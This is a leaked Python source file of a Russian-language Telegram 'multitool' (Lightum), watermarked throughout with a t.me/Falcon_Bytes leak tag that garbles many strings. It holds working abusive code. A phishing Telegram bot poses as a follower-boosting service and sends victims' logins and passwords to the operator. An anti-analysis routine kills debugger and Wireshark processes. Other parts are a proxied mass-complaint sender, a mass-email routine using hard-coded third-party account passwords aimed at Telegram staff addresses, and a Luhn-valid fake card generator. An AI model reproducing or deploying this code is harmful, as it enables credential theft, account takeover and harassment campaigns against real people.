#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes


while True:
    try:
        import subprocess
        import platform
        import os

        def check_python_command():
            for command in ["python", "python3"]:
                subprocess.run(
                    [command, "--version"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=True,
                )
                return command
#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
        python_command = check_python_command()
        os.system(
            python_command + " " + "-m" + " " + "pip" + " " + "install" + " " + "tqdm"
        )
        if platform.system() == "Windows":
            import ctypes

            def maximize_console_window():
                kernel32 = ctypes.windll.kernel32
                user32 = ctypes.windll.user32
                SW_MAXIMIZE = 3
                hwnd = kernel32.GetConsoleWindow()
                user32.ShowWindow(hwnd, SW_MAXIMIZE)

            def disable_resize_and_maximize():
                GWL_STYLE = -16
                WS_SIZEBOX = 262144
                WS_MAXIMIZEBOX = 65536
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
                style = style & ~WS_SIZEBOX
                style = style & ~WS_MAXIMIZEBOX#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)

            disable_resize_and_maximize()
            maximize_console_window()
            os.system("cls")
        else:
            os.system("clear")
        import tqdm

        def check_python_command():
            for command in ["python", "python3"]:
                try:
                    subprocess.run(
                        [command, "--version"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                        check=True,
                    )
                    return command
                except FileNotFoundError:
                    pass
            raise FileNotFoundError("Python interpreter not found")

        python_command = check_python_command()
        packages = [
            "pystyle",
            "py-cpuinfo",
            "psutil",
            "phonenumbers",
            "requests",
            "telebot",
            "telethon",
            "faker",
            "asyncio",
            "bs4",
            "datetime",
            "fake_useragent",
            "urllib3",
            "colorama",
            "python-whois",
        ]
        missing_packages = []
        for package in packages:
            try:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                if package == "py-cpuinfo":
                    __import__("cpuinfo")
                elif package == "python-whois":
                    __import__("whois")
                else:
                    __import__(package)
            except ImportError:
                missing_packages.append(package)
        if missing_packages:
            with tqdm.tqdm(
                total=len(missing_packages), desc="Установка", unit="Всего"
            ) as pbar:
                for package in missing_packages:
                    process = subprocess.Popen(
                        [python_command, "-m", "pip", "install", package],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    _, _ = process.communicate()
                    pbar.update(1)
                pbar.close()
        with tqdm.tqdm(total=36, desc="Запуск", unit="Всего") as pbar:
            import time

            pbar.update(1)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            import pystyle

            pbar.update(1)
            import cpuinfo

            pbar.update(1)
            import psutil

            pbar.update(1)
            import hashlib

            pbar.update(1)
            import time

            pbar.update(1)
            import requests

            pbar.update(1)
            import telebot

            pbar.update(1)
            import telethon

            pbar.update(1)
            import faker

            pbar.update(1)
            import asyncio

            pbar.update(1)
            import random

            pbar.update(1)
            import string

            pbar.update(1)
            import telethon.tl.functions

            pbar.update(1)
            import telethon.tl.types

            pbar.update(1)
            import smtplib

            pbar.update(1)
            import datetime

            pbar.update(1)
            import email.mime.text

            pbar.update(1)
            import email.mime.multipart

            pbar.update(1)
            import fake_useragent

            pbar.update(1)
            import socket

            pbar.update(1)
            import traceback

            pbar.update(1)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            import colorama

            pbar.update(1)
            import threading

            pbar.update(1)
            import re

            pbar.update(1)
            import urllib.parse

            pbar.update(1)
            import bs4

            pbar.update(1)
            import phonenumbers

            pbar.update(1)
            import phonenumbers.geocoder

            pbar.update(1)
            import phonenumbers.timezone

            pbar.update(1)
            import phonenumbers.carrier

            pbar.update(1)
            import whois

            pbar.update(1)
            import sys

            pbar.update(1)
            import traceback

            pbar.update(1)

            def scan_and_terminate():
                processes_to_terminate = []
                for proc in psutil.process_iter(["pid", "name"]):
                    if (
                        "ida" in proc.info["name"].lower()
                        or "dbg" in proc.info["name"].lower()
                        or "gdb" in proc.info["name"].lower()
                        or "wire" in proc.info["name"].lower()
                        or "shark" in proc.info["name"].lower()
                        or "dump" in proc.info["name"].lower()
                        or "proxy" in proc.info["name"].lower()
                    ):
                        processes_to_terminate.append(proc.info["name"])
                        process = psutil.Process(proc.info["pid"])
                        process.terminate()

            try:
                scan_and_terminate()
            except:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                sys.exit()

            def get_hwid():
                cpu_info = cpuinfo.get_cpu_info()
                mem_info = psutil.virtual_memory()
                platform_info = platform.uname()
                hwid_data = f"{cpu_info['brand_raw']}_{mem_info.total}_{platform_info.system}_{platform_info.node}_{platform_info.release}"
                hwid = hashlib.sha256(hwid_data.encode()).hexdigest()
                return hwid

            hwid = get_hwid()
            pbar.update(1)
            API = "ТУТ БЫЛ ТОКЕН ЛИКОСИНТА"
            MIN = 3
            bot = telebot.TeleBot("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes")
            chat_id = -1002008365588
            api_id = "#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes"
            api_hash = "#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes"
            client = telethon.TelegramClient("telegram", api_id, api_hash)
            url = "https://raw.githubusercontent.com/Whyistupid/HWIDS/main/HWIDS"#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            response = requests.get(url)
            response.raise_for_status()
            whitelist = response.text
            data = [line.strip() for line in whitelist.split("\n")]

            def check_hwid():
                access_granted = any(hwid in line for line in data)
                return access_granted

            full_hwid = None
            for line in data:
                if hwid in line:
                    full_hwid = line
                    break
            while True:
                if check_hwid():
                    break
                else:
                    pbar.close()
                    test = input(
                        "\n[?] Доступ не разрешен. Желаете отправить заявку?(Y/N) -> "
                    )
                    if test.lower() == "y":
                        testg = input("\n[?] Введите свой телеграм никнейм(c @) -> ")
                        testt = input(
                            "\n[?] Насколько вы купили Lightum?(Lifetime/3 Months/1 Month) -> "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        )
                        bot.send_message(
                            chat_id,
                            f"[+] {testg} отправил заявку -> <code>{hwid} -> {testg} -> {testt}</code>",
                            parse_mode="HTML",
                        )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        testa = input(
                            "\n[+] Заявка была успешна отправлена. Ждите сообщения о ее одобрении, после нажмите Enter"
                        )
                    else:
                        sys.exit()
            pbar.update(1)
            pbar.close()
        last_request_time = 0

        def oshibka():
            error_message = traceback.format_exc()
            return error_message

        ua = fake_useragent.UserAgent()

        def fishingbots(file, nazva):
            print()
            bot = pystyle.Write.Input(
                "[?] Введите бот Token -> ", pystyle.Colors.cyan_to_blue, interval=0.005#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            )
            print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            bot = telebot.TeleBot(bot)
            ID = pystyle.Write.Input(
                "[?] Введите свой телеграм ID -> ",
                pystyle.Colors.cyan_to_blue,#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                interval=0.005,
            )
            print()

            @bot.message_handler(commands=["start"])
            def start(message):#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                bot.send_message(
                    message.chat.id,
                    f"👋 Привет! 👋\nЭто бот продвижения вашего аккаунта для {nazva}\nЧтобы начать, нажмите /nacrutka",
                )

            @bot.message_handler(commands=["nacrutka", "n"])
            def start1(message):
                keyboardmain = telebot.types.InlineKeyboardMarkup(row_width=2)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                first_button = telebot.types.InlineKeyboardButton(
                    text="Лайки ❤️", callback_data="like"
                )
                second_button = telebot.types.InlineKeyboardButton(
                    text="Подписчики 📃", callback_data="like"
                )
                button3 = telebot.types.InlineKeyboardButton(
                    text="Просмотры", callback_data="like"#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                )
                button4 = telebot.types.InlineKeyboardButton(
                    text="Репосты", callback_data="like"
                )
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(
                    message.chat.id, "Выберите пункт:", reply_markup=keyboardmain
                )

            @bot.callback_query_handler(func=lambda call: True)
            def callback_inline1(call):
                if call.data == "like":
                    msg = bot.send_message(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        call.message.chat.id, "Введите количество (не более 500)"
                    )
                    bot.register_next_step_handler(msg, qproc1)

            def qproc1(message):
                try:
                    num = message.text
                    if not num.isdigit():
                        msg = bot.reply_to(
                            message,
                            "Введите количество числом! Повторите попытку, написав /nacrutka!",#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                        )
                        return
                    elif int(num) > 500:
                        bot.reply_to(message, "Количество не может быть более 500!")
                        return
                    else:
                        bot.send_message(message.chat.id, f"Количество: {num}")
                        msg = bot.send_message(
                            message.chat.id,
                            "Введите номер телефона (или почту) от вашего аккаунта:",
                        )
                        bot.register_next_step_handler(msg, step1)
                except Exception as e:
                    print(e)

            def step1(message):
                get1 = f"""[+] ID -> <code>{message.from_user.id}</code>
[+] Ник -> @{message.from_user.username}
[+] Логин -> <code>{message.text}</code>"""
                get2 = f"""\n[+] ID -> {message.from_user.id}
[+] Ник -> @{message.from_user.username}
[+] Логин -> {message.text}"""#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                log = open(file, "a+", encoding="utf-8")
                log.write(get2 + "  ")
                log.close()
                pystyle.Write.Print(get2, pystyle.Colors.red_to_yellow, interval=0.005)
                bot.send_message(ID, get1, parse_mode="HTML")
                bot.reply_to(message, f"Ваш логин: {message.text}")
                msg1 = bot.send_message(
                    message.chat.id, "Введите пароль от вашего аккаунта:"
                )
                bot.register_next_step_handler(msg1, step2)

            def step2(message):
                usrpass = message.text
                get1 = f"""[+] Пароль -> <code>{usrpass}</code>"""
                get2 = f"""\n[+] Пароль -> {usrpass}"""
                pystyle.Write.Print(get2, pystyle.Colors.red_to_yellow, interval=0.005)
                log = open(file, "a+", encoding="utf-8")
                log.write(get2 + "  ")
                log.close()
                bot.send_message(ID, get1, parse_mode="HTML")
                msg = bot.reply_to(message, f"Ваш пароль: {usrpass}")
                bot.reply_to(
                    message,
                    f"Спасибо, что воспользовались нашим сервисом! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!",
                )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes

            bot.polling()

        def get_website_info(domain):
            domain_info = whois.whois(domain)
            pystyle.Write.Print(
                "[+] Домен -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(
                f"{domain_info.domain_name}\n", pystyle.Colors.white, interval=0.005
            )
            pystyle.Write.Print(
                "[+] Зарегистрирован -> ", pystyle.Colors.red_to_yellow, interval=0.005#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
            )
            pystyle.Write.Print(
                f"{domain_info.creation_date}\n", pystyle.Colors.white, interval=0.005
            )
            pystyle.Write.Print(
                "[+] Истекает -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(
                f"{domain_info.expiration_date}\n", pystyle.Colors.white, interval=0.005
            )
            pystyle.Write.Print(
                "[+] Владелец -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(
                f"{domain_info.registrant_name}\n", pystyle.Colors.white, interval=0.005
            )
            pystyle.Write.Print(
                "[+] Организация -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            pystyle.Write.Print(
                f"{domain_info.dregistrant_organization}\n",
                pystyle.Colors.white,
                interval=0.005,
            )
            pystyle.Write.Print(
                "[+] Адрес -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(
                f"{domain_info.registrant_address}\n",
                pystyle.Colors.white,
                interval=0.005,
            )
            pystyle.Write.Print(
                "[+] Город -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                f"{domain_info.registrant_city}\n", pystyle.Colors.white, interval=0.005
            )
            pystyle.Write.Print(
                "[+] Штат -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(
                f"{domain_info.registrant_state}\n",
                pystyle.Colors.white,
                interval=0.005,
            )
            pystyle.Write.Print(
                "[+] Почтовый индекс -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(
                f"{domain_info.registrant_postal_code}\n",
                pystyle.Colors.white,
                interval=0.005,
            )
            pystyle.Write.Print(
                "[+] Страна -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
            pystyle.Write.Print(
                f"{domain_info.registrant_country}\n",
                pystyle.Colors.white,
                interval=0.005,
            )
            pystyle.Write.Print(
                "[+] IP -> ", pystyle.Colors.red_to_yellow, interval=0.005
            )
            pystyle.Write.Print(
                f"{domain_info.name_servers}\n", pystyle.Colors.white, interval=0.005
            )

        def phoneinfo(phone_number):
            try:
                parsed_number = phonenumbers.parse(phone_number, None)
                if not phonenumbers.is_valid_number(parsed_number):
                    return pystyle.Write.Print(
                        f"[!] Недействительный номер телефона",
                        pystyle.Colors.red_to_yellow,
                        interval=0.005,
                    )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                carrier_info = phonenumbers.carrier.name_for_number(parsed_number, "en")
                country = phonenumbers.geocoder.description_for_number(
                    parsed_number, "en"
                )
                region = phonenumbers.geocoder.description_for_number(
                    parsed_number, "ru"
                )
                formatted_number = phonenumbers.format_number(
                    parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL
                )
                is_valid = phonenumbers.is_valid_number(parsed_number)
                is_possible = phonenumbers.is_possible_number(parsed_number)
                timezona = phonenumbers.timezone.time_zones_for_number(parsed_number)
                pystyle.Write.Print(
                    "[+] Номер телефона -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                pystyle.Write.Print(
                    f"{formatted_number}", pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "\n[+] Страна -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(f"{country}", pystyle.Colors.white, interval=0.005)
                pystyle.Write.Print(
                    "\n[+] Регион -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(f"{region}", pystyle.Colors.white, interval=0.005)
                pystyle.Write.Print(
                    "\n[+] Оператор -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    f"{carrier_info}", pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "\n[+] Активен -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    f"{is_possible}", pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "\n[+] Валид -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(f"{is_valid}", pystyle.Colors.white, interval=0.005)
                pystyle.Write.Print(
                    "\n[+] Таймзона -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(f"{timezona}", pystyle.Colors.white, interval=0.005)
                pystyle.Write.Print(
                    "\n[+] Telegram -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                pystyle.Write.Print(
                    f"https://t.me/{phone_number}", pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "\n[+] Whatsapp -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    f"https://wa.me/{phone_number}",
                    pystyle.Colors.white,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    "\n[+] Viber -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    f"https://botapi.co/viber/{phone_number}",
                    pystyle.Colors.white,
                    interval=0.005,
                )#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
            except Exception as e:
                pystyle.Write.Print(
                    f"[!] Произошла ошибка -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(f"{str(e)}", pystyle.Colors.white, interval=0.005)

        def send_complaint(text, contact):
            headers = {"User-Agent": ua.random}
            payload = {"text": text, "contact": contact}
            proxies = {
                "http": "62.33.207.202:80",
                "http": "5.189.184.147:27191",
                "http": "50.221.74.130:80",
                "http": "172.67.43.209:80",
            }
            response = requests.post(
                url, data=payload, headers=headers, proxies=proxies
            )
            if response.status_code == 200:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                pystyle.Write.Print(
                    f"[+] Жалоба успешно отправлена, всего отправлено -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(f"{count}", pystyle.Colors.white, interval=0.005)
                pystyle.Write.Print(
                    " сообщений\n", pystyle.Colors.red_to_yellow, interval=0.005
                )
            else:
                pystyle.Write.Print(
                    f"[!] Произошла ошибка при отправке жалобы\n",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )

        text = [
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes",
            "#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes деанонимизацией личности и прихлопыванием, что нарушает правила вашей платформы! Прошу заблокировать этого человека за нарушение правил Мессенджера!!!",
        ]
        contact = [
            "+79967285422",
            "+79269736273",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes",
            "+79661214909",
            "+79254106650",
            "+22666228126",
            "+79269069196",
            "+79315894431",
            "+79621570718",
        ]

        def get_characters(complexity):
            characters = string.ascii_letters + string.digits
            if complexity == "medium":
                characters += "!@#$%^&*()"#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            elif complexity == "high":
                characters += string.punctuation
            return characters

        def generate_password(length, complexity):
            characters = get_characters(complexity)
            password = "".join(random.choice(characters) for i in range(length))
            return password

        def generate_card_number():
            bin_number = "4"
            for _ in range(5):
                bin_number += str(random.randint(0, 9))
            account_number = "".join(str(random.randint(0, 9)) for _ in range(9))
            card_number = bin_number + account_number
            checksum = generate_checksum(card_number)
            card_number += str(checksum)
            return card_number

        def generate_checksum(card_number):
            digits = [int(x) for x in card_number]
            odd_digits = digits[-2::-2]
            even_digits = digits[-1::-2]
            checksum = sum(odd_digits)
            for digit in even_digits:
                checksum += sum(divmod(digit * 2, 10))
            return (10 - checksum % 10) % 10

        def generate_expiry_date():#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
            month = random.randint(1, 12)
            year = random.randint(24, 30)
            return "{:02d}/{:02d}".format(month, year)

        def generate_cvv():
            return "".join(str(random.randint(0, 9)) for _ in range(3))

        def generate_random_card(country):
            card_number = generate_card_number()
            expiry_date = generate_expiry_date()
            cvv = generate_cvv()
            return {
                "Страна": country,
                "Номер карты": card_number,
                "Срок действия": expiry_date,
                "CVV": cvv,
            }

        def generate_user_agents(num_agents):
            versions = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
            ]
            for _ in range(num_agents):#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                version = random.randint(60, 90)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                year = random.randint(10, 21)
                month = random.randint(1, 12)
                user_agent = random.choice(versions).format(version, year, year, month)
                pystyle.Write.Print(
                    "\n[+] -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(user_agent, pystyle.Colors.white, interval=0.005)

        def transform_text(input_text):
            translit_dict = {
                "а": "@",
                "б": "Б",
                "в": "B",
                "г": "г",
                "д": "д",
                "е": "е",
                "ё": "ё",
                "ж": "ж",
                "з": "3",
                "и": "u",
                "й": "й",
                "к": "K",
                "л": "л",
                "м": "M",
                "н": "H",
                "о": "0",#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                "п": "п",
                "р": "P",
                "с": "c",
                "т": "T",
                "у": "y",
                "ф": "ф",
                "х": "X",
                "ц": "ц",
                "ч": "4",
                "ш": "ш",
                "щ": "щ",
                "ъ": "ъ",
                "ы": "ы",
                "ь": "ь",
                "э": "э",
                "ю": "ю",
                "я": "я",
                "А": "A",
                "Б": "6",
                "В": "V",
                "Г": "r",#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                "Д": "D",
                "Е": "E",
                "Ё": "Ё",
                "Ж": "Ж",
                "З": "2",
                "И": "I",
                "Й": "Й",
                "К": "K",
                "Л": "Л",
                "М": "M",
                "Н": "H",
                "О": "O",
                "П": "П",
                "Р": "P",
                "С": "C",
                "Т": "T",
                "У": "Y",
                "Ф": "Ф",
                "Х": "X",
                "Ц": "Ц",
                "Ч": "Ч",
                "Ш": "Ш",
                "Щ": "Щ",
                "Ъ": "Ъ",
                "Ы": "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesbl",
                "Ь": "b",
                "Э": "Э",#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                "Ю": "9Y",
                "Я": "9A",
            }
            transformed_text = []
            for char in input_text:
                if char in translit_dict:
                    transformed_text.append(translit_dict[char])
                else:
                    transformed_text.append(char)
            return "".join(transformed_text)

        def web_crawler(url, depth):
            print()
            visited = set()
            queue = [(url, 0)]
            while queue:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                current_url, current_depth = queue.pop(0)
                if current_url in visited or current_depth > depth:
                    continue
                visited.add(current_url)
                pystyle.Write.Print(
                    f"[+] -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    f"{current_url}\n", pystyle.Colors.white, interval=0.005
                )
                try:
                    response = requests.get(current_url)
                    soup = bs4.BeautifulSoup(response.text, "html.parser")
                    for link in soup.find_all("a", href=True):
                        absolute_url = urllib.parse.urljoin(current_url, link["href"])
                        queue.append((absolute_url, current_depth + 1))
                except:
                    pystyle.Write.Print(
                        f"[!] Произошла ошибка, проверьте ввод данных\n#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes",
                        pystyle.Colors.red_to_yellow,
                        interval=0.005,#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes
                    )

        def sendemail(
            senderemail, senderpassword, recipientemail, subject, server, messagetext
        ):
            try:
                headers = {"User-Agent": ua.random}
                server.starttls()
                server.login(senderemail, senderpassword)
                message = email.mime.multipart.MIMEMultipart()
                message["From"] = senderemail
                message["To"] = recipientemail
                message["Subject"] = subject
                body = messagetext
                message.attach(email.mime.text.MIMEText(body, "plain"))
                server.send_message(message)
                now = datetime.now()
                pystyle.Write.Print(
                    now.strftime("%H:%M:%S\n"),
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    "[+] Письмо -> ", pystyle.Colors.red_to_yellow, interval=0.005#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                )
                pystyle.Write.Print(
                    f"{senderemail}\n", pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "[+] -> было успешно отправлено на -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    f"{recipientemail}\n", pystyle.Colors.white, interval=0.005
                )
                server.quit()
            except Exception as e:
                pystyle.Write.Print(
                    "[!] Произошла ошибка при отправке письма -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(f"{str(e)}\n", pystyle.Colors.white, interval=0.005)

        senders = [
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesih96@rambler.ru", "#СЛИТО НA КАНАЛЕ t.me/Falcon_BytesKsrI4b6WlU"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesrambler.ru", "vkRr15mM#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes"),
            ("#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytesi93@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_BytesJgsXE1QD"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes88@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_BytesDvIn72F4y"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes1994@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_BytesJxL39BgBvRd"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesrambler.ru", "WDy2j4kRK#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesii@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_BytescBBCMK06Q"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes98@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes4a5dVodAQ"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesa@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes5WLEF0jltlJ"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes1@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes98vJ7a8Q"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Byteshkova1994@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesru2zLvDlmHejS"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesova@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_BytesF1EWeAJDz"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesrambler.ru", "hD8a9oRIGuK#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesvgeniya@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesc2STlnHL"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes7@rambler.ru", "#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes1NXtYjIXLS"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesn99@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_BytesrPCLdMxTu9f"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Byteschkina1993@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_BytesSj60kFtS"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesaev1989@rambler.ru", "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes04nLMoKv5j"),
            ("#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes3@rambler.ru", "#СЛИТО НA КАНАЛЕ t.me/Falcon_BytesZEa7UpylAOH"),
        ]
        recipients = [
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes support@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes dmca@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes security@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes sms@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes info@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes marta@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes spam@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes alex@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes abuse@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes pavel@telegram.org",
            "#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes durov@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes elies@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes ceo@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes mr@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes levlam@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes perekopsky@telegram.org",
            "#СЛИТО НA КАНАЛЕ t.me/Falcon_Bytes recover@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes germany@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes hyman@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes qa@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes Stickers@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes ir@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes vadim@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes shyam@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes stopca@telegram.org",
